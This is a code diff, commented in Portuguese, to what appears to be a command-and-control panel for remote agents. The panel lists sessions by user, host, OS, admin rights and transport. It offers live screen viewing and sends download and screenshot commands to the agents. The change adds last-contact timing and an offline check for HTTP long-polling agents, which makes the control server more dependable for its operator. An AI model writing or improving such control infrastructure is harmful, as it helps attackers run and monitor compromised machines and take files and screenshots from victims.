@@ -295,7 +295,7 @@ async function refresh() {
     d.appendChild(b);
     d.appendChild(document.createTextNode('  ' + s.user + '@' + s.host));
     const sm = document.createElement('small');
-    sm.textContent = s.addr + ' · ' + s.os + ' · ' + (s.admin ? 'admin' : 'user') + ' · ' + (s.transport || 'tcp') + (s.alive ? '' : ' · morto');
+    sm.textContent = s.addr + ' · ' + s.os + ' · ' + (s.admin ? 'admin' : 'user') + ' · ' + (s.transport || 'tcp') + (s.alive ? (s.seen > 8 ? ' · ' + s.seen + 's atras' : ' · ok') : ' · morto');
     d.appendChild(sm);
     d.onclick = () => {
       if (liveTimer) liveStop('tela ao vivo: off (sessao trocada)');
@@ -635,6 +635,7 @@ class App:
                 "host": i.get("host", "?"), "user": i.get("user", "?"),
                 "os": i.get("os", "?"), "admin": bool(i.get("admin")),
                 "alive": s.alive, "ip": i.get("ip", "?"),
+                "seen": int(max(0, time.time() - getattr(s, "last_seen", time.time()))),
                 "transport": getattr(s, "transport", "tcp"),
             })
         return out
@@ -655,6 +656,13 @@ class App:
         sess = self.c2.get(sid) or self.http.get(sid)
         if not sess or not sess.alive:
             return {"ok": False, "out": "session unavailable"}
+        if getattr(sess, "transport", "") == "http":
+            # o agente faz long-poll de 20s: mais de 25s sem contato = sumiu.
+            # Sem isso o painel enfileirava o comando e travava 5 min a toa.
+            age = time.time() - getattr(sess, "last_seen", 0)
+            if age > 25:
+                return {"ok": False,
+                        "out": "agente offline (ultimo contato %ds atras)" % int(age)}
         try:
             if op in ("download", "screenshot"):
                 res, data = sess.request(op, args or {}, timeout=300)
